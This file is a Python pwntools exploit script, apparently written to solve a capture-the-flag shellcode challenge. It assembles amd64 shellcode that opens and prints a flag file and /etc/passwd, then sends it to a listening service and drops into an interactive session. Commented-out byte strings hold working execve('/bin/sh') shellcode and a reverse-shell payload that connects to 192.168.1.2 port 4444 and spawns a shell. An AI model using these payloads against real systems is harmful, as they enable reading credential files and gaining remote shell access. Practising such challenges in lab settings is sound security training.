from pwn import *
import pwnlib
import binascii
context.arch = 'amd64'
print(binascii.hexlify(b'/bin/sh'))
print(binascii.hexlify(b'HELLO\n'[::-1]))
print(binascii.hexlify(b'./flag'[::-1]))
print(binascii.hexlify(b'orw/flag'[::-1]))
print(binascii.hexlify(b'///home/'[::-1]))

# exit()
# $0x68732f2f6e69622f
# a = asm('''
# 	mov rax, 0x68732f2f6e69622f
#     push rax
#     mov rdi, rsp
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 59
#     syscall
#     mov rax, 60
#     mov rdi, 0
# 	syscall
# ''')

# push
# mov rdi, 0		# stdin
# mov rsi, rsp	# buffer
# mov rdx, 6		# write_count
# mov rax, 1		# sys_write
# syscall			
# 
# 
'''
Instruction: syscall
rax: syscall number
arguments: rdi, rsi, rdx, rcx, r8, r9
return value: rax
'''

b'67616c662f77726f'
b'2f656d6f682f2f2f'
a = asm('''
	push rdx
	mov rcx, 0x67616c662f77726f
	push rcx
	mov rcx, 0x2f656d6f682f2f2f
	push rcx
	push rsp

	add rax, rbx
	push rax
	mov rdi, 1		# stdout
	pop rsi
	mov rdx, 6		# write_count
	mov rax, 1		# sys_write
	syscall	


	mov rdi, 0x67616c662f2e
	xor rsi, rsi 	# set O_RDONLY flag
	xor rdx, rdx
	mov al, 0x2
	mov rax, 2
	syscall

	lea rsi, [rsp]
	mov rdi, rax
	xor rdx, rdx
	mov dx,  0xfff  # size to read
	mov rax, 0
	syscall

	mov rdi, 1		# stdout
	mov rdx, rax 	# write_count
	mov rax, 1		# sys_write
	syscall			

	mov rax, 0x094f4c4c4548
	mov rbx, 0x010000000000
	add rax, rbx
	push rax
	mov rdi, 1		# stdout
	mov rsi, rsp	# buffer
	mov rdx, 6		# write_count
	mov rax, 1		# sys_write
	syscall	

	mov rax, 60		# sys_exit
	mov rdi, 0
	syscall

	mov rax, 0xfff	# sys_exit
	mov rdi, 0
	syscall
	''')

a= asm('''
	filename:
		xor esi, esi
		mul esi
		push rdx    
		mov rcx, 0x6477737361702f63  
		push rcx
		mov rcx, 0x74652f2f2f2f2f2f   
		push rcx

	openfile:
		push rsp
		pop rdi
		mov al, 0x2
		syscall

	readfile:
		push rax
		pop rdi
		push rsp
		pop rsi
		push rdx
		push rdx        
		push rdx
		push rdx	
		pop rax
		mov dx, 0x999
		syscall

	writefile:
		pop rdi
		inc edi
		push rax
		pop rdx
		pop rax
		inc eax
		syscall

	norma_exit:
		pop rax
		mov al, 60
		syscall
	''')
# a = asm(pwnlib.shellcraft.amd64.linux.echo("hello"))
# a = b"\xeb\x10\x48\x31\xc0\x5f\x48\x31\xf6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
# a = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
# print(len(a))
# a = b"\xeb\x21\x5e\x48\x31\xc0\x88\x46\x07\x48\x8d\x1e\x48\x89\x5e\x08\x48\x89\x46\x10\xb0\x0b\x48\x89\xf3\x48\x8d\x4e\x08\x48\x8d\x56\x10\xcd\x80\xe8\xda\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
# print(len(a))
# a = b"\x48\x31\xc0\x48\x83\xc0\x29\x48\x31\xff\x48\x89\xfa\x48\x83\xc7\x02\x48\x31\xf6\x48\x83\xc6\x01\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x48\x83\xc0\x02\xc7\x44\x24\xfc\xc0\xa8\x01\x02\x66\xc7\x44\x24\xfa\x11\x5c\x66\x89\x44\x24\xf8\x48\x83\xec\x08\x48\x83\xc0\x28\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x10\x0f\x05\x48\x31\xc0\x48\x89\xc6\x48\x83\xc0\x21\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x48\x83\xc6\x01\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x48\x83\xc6\x02\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
# print(len(a))
print(disasm(a))


# exit()


# print(a + '\n')
# exit()
# r = remote('csie.ctf.tw',10124)
r = remote('localhost',8888)
# s = r.recvline()
# print(s)

r.send(a)
	# print(r.recvline())

r.interactive()	